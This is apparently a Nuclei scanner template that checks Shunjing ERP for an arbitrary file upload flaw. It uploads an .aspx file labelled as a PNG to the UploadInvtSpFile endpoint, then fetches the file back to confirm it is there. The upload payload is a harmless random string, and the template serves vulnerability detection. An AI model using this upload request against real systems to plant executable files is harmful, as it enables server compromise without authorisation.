id: shunjingERP-UploadInvtSpFile-upload

info:
  name: 顺景ERP存在UploadInvtSpFile任意文件上传漏洞
  author: shunjingERP
  severity: high
  tags: shunjingERP

http:
  - raw:
      - |
        POST /api/cgInvtSp/UploadInvtSpFile HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close

        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
        Content-Disposition: form-data; name="file"; filename="115feed.aspx"
        Content-Type: image/png
        
        {{randstr_1}}
        ------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--

      - |+
          GET /InvtSpFiles/{{paths}} HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
          Accept-Encoding: gzip, deflate

    extractors:
      - type: regex
        part: body
        name: paths
        regex:
          - 'InvtSpFiles\\\\(.*?\.aspx)",'
        internal: true
        group: 1

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body_2
        words:
          - '{{randstr_1}}'
    matchers-condition: and
